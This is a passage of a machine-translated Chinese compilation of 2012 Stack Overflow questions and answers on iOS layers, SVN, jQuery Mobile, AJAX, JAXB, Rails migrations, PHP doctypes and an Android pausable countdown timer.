    }
 } 
```

更新：我做了进一步的测试。只有一些 segue 动画会导致问题。Cover Vertical 和 Cross Dissolve 表现出这种行为。水平翻转和部分卷曲工作正常。

我还添加了其他功能（见下文）。该类现在将显示渐变或图案以及可选的投影。属性值在设计时在情节提要中设置。

```
@property (assign) BOOL hasDropShadow;
@property (assign) BOOL hasRoundedCorners;
@property (assign) BOOL hasGradient;
@property (strong, nonatomic) UIColor *highColor;
@property (strong, nonatomic) UIColor *lowColor;
@property (strong, nonatomic) NSString *textureImage; 
```

* * *

```
- (void) awakeFromNib {
    [super awakeFromNib];
    //turning off bounds clipping allows the shadow to extend beyond the rect of the view
    if (_hasDropShadow) {
        [self setClipsToBounds:NO];
    }
    CALayer * roundRect = [CALayer layer];
    [roundRect setFrame:[self bounds]];
    if (_hasRoundedCorners) {
        [roundRect setCornerRadius:6.0f];
        [roundRect setMasksToBounds:YES];
    }
    if(_hasGradient){
        //the default colors for the gradient.  highColor is at the top, lowColor as at the bottom
        if (!_highColor){
            _highColor = [UIColor lightGrayColor];
        }
        if (!_lowColor){
            _lowColor = [UIColor darkGrayColor];
        }
        CAGradientLayer * gradient = [CAGradientLayer layer];
        [gradient setFrame:[self bounds]];
        [gradient setColors:[NSArray arrayWithObjects:(id)[_highColor CGColor], (id)[_lowColor CGColor], nil]];
        [roundRect addSublayer:gradient];
    }

    //add the rounded rect layer underneath all other layers of the view
    [[self layer] insertSublayer:roundRect atIndex:0];

    //set the shadow on the view's layer
    if (_hasDropShadow) {
        [[self layer] setShadowColor:[[UIColor blackColor] CGColor]];
        [[self layer] setShadowOffset:CGSizeMake(0, 6)];
        [[self layer] setShadowOpacity:1.0];
        [[self layer] setShadowRadius:10.0];
    }
    if(!_hasGradient){
        //set up the texture layer
        CALayer *textureLayer = [CALayer layer];
        [textureLayer setFrame:[self bounds]];
        if (_hasRoundedCorners) {
            [textureLayer setCornerRadius:6.0f];
        }
        UIColor *mycolor=[UIColor colorWithPatternImage:[UIImage imageNamed:_textureImage]];
        if (mycolor) {
            [textureLayer setBackgroundColor:mycolor.CGColor];
            [[self layer] addSublayer:textureLayer];
        }
    }
} 
```

# svn - VisualSVN 服务器 - 删除用户对历史的影响

> ID：13806504
> 
> 赞同：4
> 
> 时间：2012-12-10T18:00:52.890
> 
> 标签：svn, visualsvn-server

当您从 SVN 中删除用户时，是否会影响历史记录。我找不到任何关于它的文档。谢谢。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-12-10T18:47:44.817

**不：**

1.  SVN 中的历史是不可变的，
2.  删除用户禁止*将来使用此凭据*，但与以前版本的作者身份没有任何关系。

# jquery-mobile - 使用 jQM 页眉和页脚将非 jqueryMobile 页面加载到 jQM DOM

> ID：13806513
> 
> 赞同：0
> 
> 时间：2012-12-10T18:01:26.410
> 
> 标签：jquery-mobile

我有一个 html 页面，我正在使用 jquery mobile 来创建一个具有多个具有 data-role="page" 属性的 div 的 Web 应用程序。每个页面都有一个固定的页眉和页脚，通过页面转换保持一致。

但是，我想将另一个不是在 jquery-mobile 框架中构建但在同一目录中的 html 页面加载到 DOM 中，并在该页面上显示持久的、固定的页眉和页脚。

这可能吗？我查看了使用 $mobile.changePage() 和 $mobile.loadPage() 的 jquery Mobile 文档，但并不清楚如何实现它。

到目前为止，我有这个（根据@Jack 的说明进行编辑）：

HTML

```
 <div data-role="page" id="dog_bars">
    <div data-role="header" data-position="fixed" data-id="dog_header" class="custom_dog_header">
        <h1>Dog About Town</h1>
    </div>
    <div data-role="content">
        <ul data-role="listview" data-filter="true">
            <li data-icon="home"><a href="#external_page" data-transition="slide" id="external_link">
                <h2>303 Bar &amp; Grill</h2>
                <p>303 W. Davis St., Dallas</p>
        </a></li>
            </ul>
    </div>
    <div data-role="footer" data-id="bestFooter" data-position="fixed">
        <nav data-role="navbar">
            <ul>                
                <li><a href="#home" data-transition="slide" data-role="button" data-icon="home">Home</a></li>
                <li><a href="#about" data-transition="slide" data-role="button" data-icon="gear">About</a></li>                    
            </ul>            
        </nav> 
    </div><!-- end footer -->          
</div>

<!-- page to be loaded into -->

<div data-role="page" class="content_page" id="external_page">
    <div data-role="header" data-position="fixed" data-id="dog_header" class="custom_dog_header">
        <h1>Casual Dining</h1>
    </div><!-- end header -->
    <section data-role="content" class="content" id="external">

    </section>
    <div data-role="footer" data-id="bestFooter" data-position="fixed">
        <nav data-role="navbar">
            <ul>                
                <li><a href="#home" data-transition="slide" data-role="button" data-icon="home">Home</a></li>
                <li><a href="#dog_casual" data-transition="slide" data-role="button" data-icon="back">Back</a></li>                    
                <li><a href="#about" data-transition="slide" data-role="button" data-icon="gear">About</a></li>                    
            </ul>            
        </nav> 
    </div><!-- end footer -->
</div><!--end page--> 
```

jQuery

```
$(document).on('pageinit'(function() {
$("#external").load("external_page.html").trigger("create");
})); 
```

目前，单击该链接可以很好地加载带有页眉和页脚的#external_page，但不会加载external_page.html 的内容。#external_page 的部分仍然是空的。

想法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T14:47:14.037

您应该能够使用 jQuery 的[load](http://api.jquery.com/load/)来加载外部页面，然后将其包装在`data-role="page"`带有适当页眉/页脚的 div 中，将其附加到 DOM，然后触发[create 事件](http://jquerymobile.com/demos/1.2.0/docs/pages/page-scripting.html)来初始化页面。或者，您也可以在第一页上准备一个*页面包装器*（带有 div 的 div `data-role="page"`），然后将外部页面的内容插入其中（您现在尝试这样做的方式）。

查看您当前的 JavaScript，您的[.on](http://www.bing.com/search?q=jquery%20api%20on&form=MOZSBR&pc=MOZI)语法有点偏离，并且缺少逗号。

使用您的标记，您应该能够执行以下操作

```
<div data-role="page" id="dog_bars">
    <div data-role="header" data-position="fixed" data-id="dog_header" class="custom_dog_header">
        <h1>Dog About Town</h1>
    </div>
    <div data-role="content">
        <ul data-role="listview" data-filter="true">
            <li data-icon="home"><a href="#external_page" data-transition="slide" id="external_link">
                <h2>303 Bar &amp; Grill</h2>
                <p>303 W. Davis St., Dallas</p>
        </a></li>
            </ul>
    </div>
    <div data-role="footer" data-id="bestFooter" data-position="fixed">
        <nav data-role="navbar">
            <ul>                
                <li><a href="#home" data-transition="slide" data-role="button" data-icon="home">Home</a></li>
                <li><a href="#about" data-transition="slide" data-role="button" data-icon="gear">About</a></li>                    
            </ul>            
        </nav> 
    </div><!-- end footer -->          
</div>

<!-- page to be loaded into -->

<div data-role="page" class="content_page" id="external_page">
    <div data-role="header" data-position="fixed" data-id="dog_header" class="custom_dog_header">
       <a href="#" data-rel="back" data-icon="back">Back</a> <h1>Casual Dining</h1>
    </div><!-- end header -->
    <section data-role="content" class="content" id="external">

    </section>
    <div data-role="footer" data-id="bestFooter" data-position="fixed">
        <nav data-role="navbar">
            <ul>                
                <li><a href="#home" data-transition="slide" data-role="button" data-icon="home">Home</a></li>
                <li><a href="#dog_casual" data-transition="slide" data-role="button" data-icon="back">Back</a></li>                    
                <li><a href="#about" data-transition="slide" data-role="button" data-icon="gear">About</a></li>                    
            </ul>            
        </nav> 
    </div><!-- end footer -->
</div><!--end page-->   

    <script type="text/javascript">
        $(document).on('pageinit', '#dog_bars', function () {
             //you can probably leave out the trigger('create') since the wrapper
             //is already part of the DOM and JQM should enhance it
            $('#external').load("external_page.html").trigger("create");
        });
    </script> 
```

**external_page.html**

```
<!DOCTYPE >
<html >
<head>
    <title></title>
</head>
<body>
    <div id="pageWrapper">
        <p>Some test text</p>
        <input type="text" />

        <select>
            <option value="value">Option1</option>
            <option value="value2">Option2</option>
        </select>

    </div>
</body>
</html> 
```

# java - Unitronics OPC 服务器 -> JIException 访问被拒绝

> ID：13806515
> 
> 赞同：1
> 
> 时间：2012-12-10T18:01:29.330
> 
> 标签：java, opc

我尝试连接到我安装在计算机上的 Unitronics 的 OPC 服务器。但无论我尝试什么，我都无法弄清楚如何连接到它。我正在与 utgard、openscada、jinterop 合作，我对这个话题很陌生。如果我使用另一个 OPC 客户端，如 PowerOPC 浏览器或 kassl opc 客户端，则连接没有问题。

```
JISession session=JISession.createSession("localhost","<mycomputeradmin>","<myadminpw>");

serverList=new ServerList ( session, "localhost"); 
```

问题是我得到一个JIException Access denied，但我的登录信息应该是正确的：org.jinterop.dcom.common.JIException: Access is denied, please check the [domain-username-password]是否正确。此外，如果尚未完成，请查看 readme.htm 中的 GETTING STARTED 和 FAQ 部分。它们提供了有关如何正确配置 Windows 机器以进行 DCOM 访问的信息，以避免此类异常。 `[0x00000005]`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T19:43:00.923

很长一段时间后，我终于找到了一个处理 OPC 的不同库。**JEasyOPC** 我现在正在使用它，它工作得很好，而且很容易设置。

# c# - 未从列表中获取某些项目

> ID：13806519
> 
> 赞同：-3
> 
> 时间：2012-12-10T18:01:48.897
> 
> 标签：c#

嗨，我有以下代码用于在添加学生后从列表中搜索学生 ID。我第一次获取它时，它可以正常工作，但是当我添加另一个学生并搜索该特定 ID 时，我找不到它。有人可以告诉我错误在哪里吗？

```
public void AddMarks(int id)
{
    for (int i = 0; i < mystudent.Count; i++)
    {
        if (mystudent[i].Id == id)
        {
            foreach (Student st in mystudent)
            {
                 Console.WriteLine("enter Mathematics halfyearly exam");
                 Maths.HYEXAM = Int16.Parse(Console.ReadLine());
                 Console.WriteLine("enter Mathematics annualyear exam");
                 Maths.ANEXAM = Int16.Parse(Console.ReadLine());
            }
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-10T18:04:40.757

好吧，看看你的循环。它没有对学生做*任何事情*......相反，您正在设置这样的变量：

```
Maths.HYEXAM = Int16.Parse(Console.ReadLine()); 
```

这当然*看起来*像你正在设置一个静态变量。你是？如果是这样，您需要返回并修改“静态”的含义。弄清楚该标记如何与您感兴趣的特定学生相关联。

然后找出为什么你有*两个*循环 - 为什么你用一个循环遍历所有学生`for`，然后如果你找到一个匹配，你又用一个`foreach`循环遍历它们......

# javascript - 通过 $.ajax 和 $.get/$.post 填充关联数组的区别

> ID：13806521
> 
> 赞同：4
> 
> 时间：2012-12-10T18:01:54.993
> 
> 标签：javascript, jquery, associative-array

我试图填充全局 var`selectedDates`认为是第一个函数，但是当我尝试获取一些值时它失败**了，例如，`selectedDates['1/23/2013']`**

在尝试使用 $.ajax 而不是 $.get 之后，我可以获得类似`selectedDates['1/23/2013']`.

如果它们都填充`the_selected_dates`返回给 set的外部 var，那么区别在哪里`selectedDates`？

```
var selectedDates = {}; 
```

**功能使用`$.get`失败：**

```
function getSelectedDates_fails(lead_id, month) {
    var the_selected_dates = {};
    $.get(
            window.location.href,
            {
                gf_lm_ajax : 1,
                get : 'lead_reminder_get_dates',
                lead_id : lead_id,
                month : month,
                nonce_gf_lm_ajax : gf_lmJsVars.nonce_gf_lm_ajax

            },
    function(output) {
        $.each(output.reminders, function(n, val) {
            the_selected_dates[val.date] = val.date;
        });
    }, 'json');
    return the_selected_dates;
}
selectedDates = getSelectedDates_fails(35, 12); console.debug(selectedDates); 
```

**调试数据**

![在此处输入图像描述](../Images/6e3fc7e65831ca043c8e2e1aae711ef8.png)

![在此处输入图像描述](../Images/0c7f72cb4a90904dd76728f1d818738c.png)

**使用`$.ajax`作品的功能：**

```
function getSelectedDates_works(lead_id, month) {
    var the_selected_dates = {};
    $.ajax(
            {
                url : window.location.href,
                dataType : 'json',
                data : {
                    gf_lm_ajax : 1,
                    get : 'lead_reminder_get_dates',
                    lead_id : lead_id,
                    month : month,
                    nonce_gf_lm_ajax : gf_lmJsVars.nonce_gf_lm_ajax
                },
                async : false,
                success : function(output)
                {
                    $.each(output.reminders, function(n, val) {
                        the_selected_dates[val.date] = val.date;
                    });
                }
            });
    return the_selected_dates;
}
selectedDates = getSelectedDates_works(35, 12); console.debug(selectedDates); 
```

**调试数据**

![在此处输入图像描述](../Images/a8e80dccb1dd6833bf2c6a62afb03d1b.png) ![在此处输入图像描述](../Images/498ec8438b52e1f91a034b98f2f720f1.png)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-10T18:05:23.897

当你`$.ajax` *同步*运行时，`$.get`不是。

这就是为什么`getSelectedDates_fails()`返回的速度比您从服务器获得响应的速度要快，因此返回一个空对象`{}`.

您看到的`selectedDates`是*异步*完成请求之前对象的状态。

* * *

您可以使用[`$.ajaxSetup()`](http://api.jquery.com/jQuery.ajaxSetup/)全局更改所有`$.ajax`调用的行为。但是，我不建议将其设置`async`为`false`.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-10T18:10:09.600

设置时`async: false`，您的成功处理程序将在 main 函数返回之前首先运行；这就是它起作用的原因。但是，**不建议**这样做，因为它会在执行呼叫时挂起您的浏览器。

您应该以异步方式执行此操作，方法是将回调函数传递给您的`getSelectedDates_works()`函数，该函数在处理结果时被调用。这样，浏览器就可以在请求和响应之间“休息”。

```
function getSelectedDates_works(lead_id, month, cb) 
{
    $.ajax({
        // ...
        success: function(output) {
            var the_selected_dates = [];
            $.each(output.reminders, function(n, val) {
                 the_selected_dates[val.date] = val.date;
            });
            // perform callback
            cb(the_selected_dates);
        }
    });
}

getSelectedDates_works(123, 456, function(dates) {
    // do stuff with dates here
}); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-12-10T18:16:19.350

您应该异步获取数据，并确保在您决定对返回的数据执行某些操作时完成 ajax 函数：

```
function getSelectedDates(lead_id, month) {
    return $.ajax({
        url: window.location.href,
        dataType: 'json',
        data: {
            gf_lm_ajax: 1,
            get: 'lead_reminder_get_dates',
            lead_id: lead_id,
            month: month,
            nonce_gf_lm_ajax: gf_lmJsVars.nonce_gf_lm_ajax
        }
    });
}

getSelectedDates(35, 12).done(function(output) {
    var the_selected_dates = {};
    $.each(output.reminders, function(n, val) {
        the_selected_dates[val.date] = val.date;
    });
    console.log(selectedDates);
});​ 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-12-10T18:07:44.500

你有`aysnc: false`你的`$.ajax`，这是一个你不能`$.get`直接打开的设置——你必须使用`$.ajaxSetup`. 不过，这可能不是您想要做的事情，但如果 ajax 请求异步运行，`return the_selected_dates;`则在 ajax 请求完成之前到达。相反，您必须在回调中进行调试。

# java - Java 使用 JAXB 和选定的输出解组 XML 文档文件

> ID：13806529
> 
> 赞同：0
> 
> 时间：2012-12-10T18:02:21.897
> 
> 标签：java, xml, jaxb, unmarshalling

我还是编程新手，如果有人能帮我解决这个问题，我将不胜感激，基本上我有一个电影文件，我想解组，并且只有“罗伯特·本顿”人/导演作为 system.out 的输出。

**带有 JAXBU 的 Java 类**

```
 package jaxbadv;

    import java.io.File;
    import java.util.Iterator;
    import java.util.List;

    import org.me.media.*;
    /**
     *
     * @author Ket
     */
    public class rbFilms {

    public static void main(String[] args) {
        // Create root XML node 'todaysShow' and get its main element 'movies_today'
        ShowingToday todaysShow = new ShowingToday();
        List<MovieType> movies_today =  todaysShow.getMovieCollection();
        // Create Movie instanses and add them to the 'movies_today' collection
        MovieType film;

        film = new MovieType();
        film.getTitle();
        film.getDirector();
        film.getYear();

        try {
            javax.xml.bind.JAXBContext jaxbCtx = javax.xml.bind.JAXBContext.newInstance(film.getClass().getPackage().getName());
            javax.xml.bind.Unmarshaller unmarshaller = jaxbCtx.createUnmarshaller();
            film = (MovieType) unmarshaller.unmarshal(new java.io.File("Now_Showing.txt")); //NOI18N

            //print out only movies produced after 1990
            MovieType nextMovie = new MovieType();
            Iterator itr = movies_today.iterator();
            while(itr.hasNext()) {
                nextMovie = (MovieType) itr.next();
                if(nextMovie.getDirector() == "Robert Benton") {
                    System.out.println(nextMovie.getTitle());
                }
            }

        } catch (javax.xml.bind.JAXBException ex) {
            // XXXTODO Handle exception
            java.util.logging.Logger.getLogger("global").log(java.util.logging.Level.SEVERE, null, ex); //NOI18N
        }

    }
} 
```

**XML 文件**

```
 <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Showing_Today xmlns="http://xml.netbeans.org/schema/Shows">
    <movie_collection>
        <Title>Red</Title>
        <Director>Robert Schwentke</Director>
        <Year>2010</Year>
    </movie_collection>
    <movie_collection>
        <Title>Kramer vs Kramer</Title>
        <Director>Robert Benton</Director>
        <Year>1979</Year>
    </movie_collection>
    <movie_collection>
        <Title>La Femme Nikita</Title>
        <Director>Luc Besson</Director>
        <Year>1997</Year>
    </movie_collection>
    <movie_collection>
        <Title>Feast of love</Title>
        <Director>Robert Benton</Director>
        <Year>2007</Year>
    </movie_collection>
</Showing_Today> 
```

**JAXB 绑定生成源 - ShowingToday**

```
 package org.me.media;

import java.util.ArrayList;
import java.util.List;
import javax.xml.bind.annotation.XmlAccessType;
import javax.xml.bind.annotation.XmlAccessorType;
import javax.xml.bind.annotation.XmlElement;
import javax.xml.bind.annotation.XmlRootElement;
import javax.xml.bind.annotation.XmlType;

@XmlAccessorType(XmlAccessType.FIELD)
@XmlType(name = "", propOrder = {
    "movieCollection"
})
@XmlRootElement(name = "Showing_Today")
public class ShowingToday {

    @XmlElement(name = "movie_collection")
    protected List<MovieType> movieCollection;

public List<MovieType> getMovieCollection() {
        if (movieCollection == null) {
            movieCollection = new ArrayList<MovieType>();
        }
        return this.movieCollection;
    }

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-10T18:07:41.767

您可能想从一些更简单的练习开始，您在代码中犯了一些基本的 Java 错误。例如，您有一些无效的分配：

```
showingToday todaysShow = new ShowingToday(); // value isn't used
List<MovieType> movies_today =  todaysShow.getMovieCollection(); // value isn't used 
```

在某些地方，您正在初始化一个变量并对其进行无效`get`调用：

```
film = new MovieType(); // values is never used
film.getTitle();        // this and the other get calls are not needed
film.getDirector();
film.getYear(); 
```

你会想要修复这些。

* * *

至于您的特定 JAXB 问题，据我所知，您应该`ShowingToday`从 XML 流中反序列化一个实例，然后从中访问信息。代码将与此类似：

```
try {
   final JAXBContext context = JAXBContext
         .newInstance(ShowingToday.class);
   final Unmarshaller unmarshaller = context.createUnmarshaller();
   final ShowingToday showingToday = unmarshaller.unmarshal(
         new StreamSource(new File("absolute path of file here")),
         ShowingToday.class).getValue();

} catch (final Exception e) {
   // Do something useful here
} 
```

# ruby-on-rails-3 - 在 gem 迁移中使用 add_foreign_key 的问题

> ID：13806531
> 
> 赞同：0
> 
> 时间：2012-12-10T18:02:23.703
> 
> 标签：ruby-on-rails-3, foreign-keys, rails-migrations

我发现这里的答案没有帮助：[Rails 3 Add Foreign Key in Migration Problems](https://stackoverflow.com/questions/3631717/rails-3-add-foreign-key-in-migration-problems)

实现邮箱 gem 的命名空间分支我遇到以下问题：

```
add_foreign_key "mailboxer_receipts", "mailboxer_notifications", :name => "receipts_on_notification_id"
#Messages  
add_foreign_key "mailboxer_notifications", "mailboxer_conversations", :name => "notifications_on_conversation_id"
add_foreign_key :pairs, :programmers,
     :source_column => :second_id,
     :name => :fk_second_programmer 
```

完整文件在这里：[https ://github.com/daveworth/mailboxer/blob/namedspaced/db/migrate/20110511145103_create_mailboxer.rb](https://github.com/daveworth/mailboxer/blob/namedspaced/db/migrate/20110511145103_create_mailboxer.rb)

这里的文档对我没有帮助：http: [//araddconstraint.rubyforge.org/classes/ActiveRecord/ConnectionAdapters/SchemaStatements.html](http://araddconstraint.rubyforge.org/classes/ActiveRecord/ConnectionAdapters/SchemaStatements.html)

最后一个外键似乎是从上面的文档链接中复制的 (???)。这些错误抱怨无关紧要的外键名称 - 这让我认为这是一个语法错误。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-05-07T22:57:12.497

我需要一个名为[foreigner的 gem，因为它没有在](https://github.com/matthuhiggins/foreigner)[mailboxer](https://github.com/ging/mailboxer)中列为依赖项。邮箱的一个分支修复了命名空间问题，但邮箱已经死了，我建议避免它。

# javascript - 使用 FTP jquery 上传图片 检查图片是否加载

> ID：13806536
> 
> 赞同：2
> 
> 时间：2012-12-10T18:02:36.570
> 
> 标签：javascript, jquery

我一直在寻找解决问题的方法，但还没有找到我想要的东西。

好吧，我有一个网页，其中每 5 秒从网络摄像头拍摄一次“实时图像”，我使用 FTP 上传图像并用新图像替换旧图像。我的问题是，有时 FTP 在传输过程中并且图像被截断，所以我想说如果图像是加载显示，如果不是不“刷新”图像。这是我的代码：

```
setInterval(function(){
   $("#imagerefresh").attr("src", "images/image_1.jpg?"+new Date().getTime()).load();
},5000); 
```

我发现很多帖子，他们询问如何检查图像是否已加载，并尝试了它们，但它们只执行一次，就像这个：

```
setInterval(function(){
   $("#imagerefresh").load(function(){
      $("#imagerefresh").attr("src", "images/image_1.jpg?"+new Date().getTime());
   })
 },5000); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-10T18:30:16.303

试试这个：

```
setInterval(function() {
    $("#imagerefresh").load(function() {
        console.log("image loaded correctly");
    }).error(function() {
        console.log("error loading image");
        $(this).unbind("error").attr("src", $(this).attr("src"));
    }).attr("src", "images/image_1.jpg?" + new Date().getTime());
})
}, 5000);​ 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-10T18:09:50.127

使用来自 jQuery 的错误事件可能会起作用，所以像这样：

```
function load() {

    $("#imagerefresh").attr("src", "images/image_1.jpg?"+new Date().getTime());

    $("#imagerefresh").error(function(){
        load();
    }).load(function(){
        setInterval(load(), 5000);
    });

} 
```

# sql - 如何增加/替换脚本中的所有数字

> ID：13806538
> 
> 赞同：1
> 
> 时间：2012-12-10T18:02:43.843
> 
> 标签：sql, regex, notepad++, textpad

我有一个相当大的 SQL 脚本，在插入发生的数据库上有重复的身份。

如果我可以将脚本中的所有整数增加 20，这应该可以解决这个问题。我试图弄清楚如何在 Notepad++ 和 Textpad 中做到这一点，但惨遭失败。

希望有人可以对我如何做到这一点提出一些建议。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-10T21:00:51.470

很难准确理解您在寻找什么。您可以轻松地将零添加到每个整数的末尾。发布一个示例，我可能会提供更多帮助。Notepad++ 技巧是我的最爱之一。

```
Enable Regex Searching in Notepad++. 
Search for   :([0-9]*[0-9])
Replace with :\10
( \1 is the value that was found ) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-10T18:16:38.233

而不是更新您的脚本，也许您可​​以简单地将现有数据库值减少 20 (-20) 以便能够按原样运行您的脚本。无论哪种方式，您都必须考虑更改可能是主键和外键的内容 - 并保留这些关系。

# php - 如果我在网页中使用 PHP，我应该修改我的 DTD 吗？

> ID：13806539
> 
> 赞同：0
> 
> 时间：2012-12-10T18:02:45.883
> 
> 标签：php, html, dtd

我总是在我的网页上包含以下 DTD：

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"> 
```

我想在我的一个网站上开始使用 PHP。我应该以任何方式修改此 DTD 以使其保持有效吗？

有什么理由**不**应该在 DTD 之前使用 PHP 块，或者 DTD 应该始终是每个文件的开头吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-10T18:04:11.963

是的，您应该这样做，不是因为您使用的是 PHP，而是因为您现在应该使用 HTML5。

```
<!DOCTYPE html> 
```

doctype 与 PHP 根本没有任何关系，因为它是一种服务器端语言。但是，文档类型会影响您输出的 HTML。

如果在 doctype 之前输出任何字符，某些浏览器（阅读：IE）可能会出现问题，并且在 doctype 之前使用 PHP 通常不是问题，只需确保在 doctype 之前的 HTML 中没有空格或换行符输出。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-10T18:05:05.443

Php 是一种为浏览器生成文本的服务器端语言。无论 HTML 是如何生成的，浏览器都以完全相同的方式解释 HTML 文本。硬编码的 html 在浏览器中的解释方式与 ASP 生成的 HTML 相同，后者的解释方式与 PHP 生成的 HTML 相同。

因此，您`Doctype`不需要根据任何选择的服务器端脚本语言进行定制**。**

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-10T18:03:46.847

## 简单来说

与`DOCTYPE`PHP 无关，它是您需要注意的返回给浏览器的内容。

## 详细解答

它`DOCTYPE`只是告诉浏览器如何解释页面和组成页面的代码。作为`PHP`一种服务器端语言，它与此无关，除非您输出的特定 HTML 需要与`DOCTYPE`您定义的不同。

## 信用

@adeneo 正确地补充说你应该改变它，但不是因为它与 PHP 有任何关系。对于 HTML 5，您必须使用以下方式声明文档类型：

```
<!DOCTYPE html> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-10T18:06:08.130

PHP 输出 HTML（或其他浏览器可显示的内容）。只要输出的 HTML 符合您的 doctype，您就可以继续使用您选择的 doctype。如果您不知道 doctype 是什么以及做什么，这里有一个古老但很好的参考：[http ://www.alistapart.com/articles/doctype/](http://www.alistapart.com/articles/doctype/)

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2012-12-10T18:19:37.910

用于生成页面的服务器端技术的选择并不影响文档类型的选择。重要的是发送到浏览器的标记。

doctype 语句（不是 DTD——它原则上是对 DTD 的引用，尽管浏览器不会这样对待它）应该位于 HTML 文档的开头，但这适用于发送给浏览器的 HTML 文档。.php 文件并不是真正的 HTML 文档（或者不一定是），并且任何 PHP 指令在开始时都将由服务器端代码处理，并且永远不会到达浏览器。

# android - 如何通过暂停延长倒数计时器？

> ID：13806545
> 
> 赞同：0
> 
> 时间：2012-12-10T18:03:10.217
> 
> 标签：android, timer, countdown

这似乎是一个常见问题，“我如何暂停倒数计时器”？

我发现这段代码看起来很有希望：

[http://www.java2s.com/Open-Source/Android/Timer/multitimer-android/com/cycleindex/multitimer/CountDownTimerWithPause.java.htm](http://www.java2s.com/Open-Source/Android/Timer/multitimer-android/com/cycleindex/multitimer/CountDownTimerWithPause.java.htm)

我只是不确定如何在代码中实现它。我需要重写抽象方法并扩展类。有人可以告诉我如何做到这一点吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-10T18:46:02.850

这是你的布局

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
              android:orientation="vertical"
              android:layout_width="fill_parent"
              android:layout_height="fill_parent"
        >
    <TextView
            android:layout_width="fill_parent"
            android:layout_height="wrap_content"
            android:text="0"
            android:gravity="center_horizontal"
            android:layout_marginBottom="40dp"
            android:layout_marginTop="20dp"
            android:textSize="27dp"
            android:id="@+id/txtView"/>
    <RelativeLayout
            android:layout_width="wrap_content"
            android:layout_height="fill_parent"
            android:layout_gravity="center">
        <Button
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:text="Start"
                android:id="@+id/startButton"/>
        <Button
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:text="Stop"
                android:id="@+id/stopButton"
                android:layout_toRightOf="@id/startButton"/>
    </RelativeLayout>
</LinearLayout> 
```

这是你的活动课

```
import android.app.Activity;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

public class MyActivity extends Activity implements View.OnClickListener {

    TextView txt = null;
    Button startButton = null;
    Button stopButton = null;
    CountDownTimerWithPause timer = null;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);

        txt = (TextView) findViewById(R.id.txtView);
        startButton = (Button) findViewById(R.id.startButton);
        stopButton = (Button) findViewById(R.id.stopButton);

        startButton.setOnClickListener(this);
        stopButton.setOnClickListener(this);
    }

    @Override
    public void onClick(View view) {
        if (view == startButton) {
            if (timer == null) {
                initTimer();
            }

            timer.resume();
        }

        if (view == stopButton) {
            timer.pause();
        }
    }

    private void initTimer() {
        timer = new CountDownTimerWithPause(10000, 1000, false) {
            @Override
            public void onTick(long millisUntilFinished) {
                Integer currentValue = Integer.valueOf((String) MyActivity.this.txt.getText());
                MyActivity.this.txt.setText(String.valueOf(currentValue + 1));
            }

            @Override
            public void onFinish() {
                Toast.makeText(MyActivity.this, "finish", Toast.LENGTH_SHORT).show();
            }
        };

        timer.create();
    }
} 
```

不要忘记将[CountDownTimerWithPause](http://www.java2s.com/Open-Source/Android/Timer/multitimer-android/com/cycleindex/multitimer/CountDownTimerWithPause.java.htm)复制到您的包中。

对我有用，**但是**...

我提到了一些错误，但这取决于您的应用程序。也许对你来说没问题。错误是 - 启动计时器时，它会立即触发。'所以呢？' 你可能会问。想象一下，当 3 秒半过去时，您单击停止按钮。因此，当您单击“开始”按钮时，您希望在看到 4 之前通过半秒，但在该类实现中不会。

计数结束时有一些奇怪的延迟。我建议寻找更好的实现。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-10T19:14:29.937

我`CountDownTimerWithPause`在我的项目中使用过，它非常简单。看看我刚刚写的这个示例代码来解释这个计数器的实现。

## 步骤1

我创建了示例 XML 布局，只是为了稍后更好地解释。此布局包含 3 个按钮：

1.  开始
2.  暂停
3.  恢复

布局：

```
<Button
    android:id="@+id/button_start"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:text="Start" />

<Button
    android:id="@+id/button_pause"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:text="Pause" />

<Button
    android:id="@+id/button_resume"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:text="Resume" /> 
```

## 第2步

仅对于此示例，我在 Activity 中工作。所以这是代码：

```
public class MainActivity extends Activity
{

    private CountDownTimerWithPause _countDownTimerWithPause = null;

    @Override
    protected void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.timer);

        /*
         * Definition of the counter
         */
        _countDownTimerWithPause = new CountDownTimerWithPause(10000, 1000, true)
        {

            @Override
            public void onTick(long millisUntilFinished)
            {
                Toast.makeText(getApplicationContext(), "Tick", Toast.LENGTH_SHORT).show();
            }

            @Override
            public void onFinish()
            {
